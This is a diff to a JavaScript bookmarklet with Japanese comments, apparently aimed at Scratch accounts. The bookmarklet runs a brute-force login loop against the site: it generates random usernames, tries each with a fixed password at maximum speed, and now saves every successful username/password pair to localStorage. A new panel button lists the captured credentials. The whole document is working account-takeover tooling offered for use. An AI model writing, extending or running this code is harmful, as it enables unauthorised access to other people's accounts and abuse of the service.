@@ -1,6 +1,29 @@
 javascript:(function(){
 try{
   const used = new Set();
+  const STORAGE_KEY = "scratch_brute_success";
+
+  // 過去の成功結果を取得
+  function getSavedResults() {
+    const data = localStorage.getItem(STORAGE_KEY);
+    return data ? JSON.parse(data) : [];
+  }
+
+  // 成功結果を保存
+  function saveResult(username, password) {
+    const results = getSavedResults();
+    // 重複チェック
+    if (!results.some(r => r.username === username)) {
+      results.push({
+        username: username,
+        password: password,
+        time: new Date().toLocaleString('ja-JP')
+      });
+      localStorage.setItem(STORAGE_KEY, JSON.stringify(results));
+      return true;
+    }
+    return false;
+  }
 
   function g(n){
     var m = document.cookie.match(new RegExp("(?:^|; )"+n+"=([^;]*)"));
@@ -42,7 +65,13 @@ try{
       });
 
       if(res.status === 200){
-        log("lime", "成功: " + u);
+        const saved = saveResult(u, p);
+        log("lime", `成功: ${u}`);
+        if (saved) {
+          log("#00ffaa", `→ 保存しました (${u})`);
+        } else {
+          log("yellow", `→ すでに保存済み (${u})`);
+        }
         return true;
       }
       return false;
@@ -60,27 +89,49 @@ try{
         position: "fixed",
         top: "10px",
         right: "10px",
-        width: "300px",
-        maxHeight: "70vh",
+        width: "340px",
+        maxHeight: "80vh",
         overflowY: "auto",
-        background: "rgba(0,0,0,0.85)",
+        background: "rgba(0,0,0,0.88)",
         color: "white",
         border: "1px solid #444",
         zIndex: 999999,
-        fontSize: "14px",
+        fontSize: "13px",
         padding: "10px",
         fontFamily: "Consolas, monospace",
-        borderRadius: "4px"
+        borderRadius: "6px",
+        boxShadow: "0 2px 10px rgba(0,0,0,0.5)"
       });
 
-      let btn = document.createElement("button");
-      btn.textContent = "STOP";
-      btn.style.cssText = "width:100%; padding:8px; margin-bottom:8px; background:#c00; color:white; border:none; border-radius:4px; cursor:pointer;";
-      btn.onclick = () => {
+      // STOPボタン
+      let stopBtn = document.createElement("button");
+      stopBtn.textContent = "STOP";
+      stopBtn.style.cssText = "width:100%; padding:8px; margin-bottom:8px; background:#c00; color:white; border:none; border-radius:4px; cursor:pointer;";
+      stopBtn.onclick = () => {
         clearInterval(window.loginTimer);
         log("orange", "停止しました");
       };
-      d.appendChild(btn);
+      d.appendChild(stopBtn);
+
+      // 保存済み結果表示ボタン
+      let showBtn = document.createElement("button");
+      showBtn.textContent = "保存済み結果を表示";
+      showBtn.style.cssText = "width:100%; padding:8px; margin-bottom:8px; background:#0066cc; color:white; border:none; border-radius:4px; cursor:pointer;";
+      showBtn.onclick = () => {
+        const results = getSavedResults();
+        if (results.length === 0) {
+          log("silver", "保存された結果はありません");
+          return;
+        }
+        log("cyan", "──── 保存済み結果 ──────");
+        results.forEach((r, i) => {
+          log("white", `[${i+1}] ${r.time}`);
+          log("#88ff88", `ユーザー: ${r.username}`);
+          log("#ffcc88", `パスワード: ${r.password}`);
+          log("gray", "──────────────────────");
+        });
+      };
+      d.appendChild(showBtn);
 
       document.body.appendChild(d);
     }
@@ -108,16 +159,15 @@ try{
 
     const opts = { includeLetters, includeSymbols, includeNumbers };
 
-    log("white", "開始しました");
+    log("white", "開始しました  (成功したら自動保存されます)");
 
     window.loginTimer = setInterval(async () => {
       let user;
       do {
         user = r(len, opts, must);
-      } while(!user);  // 重複したら即再生成
+      } while(!user);
 
       await login(user, pass);
-      // 成功以外は何も表示しない
     }, 0);
 
   })();
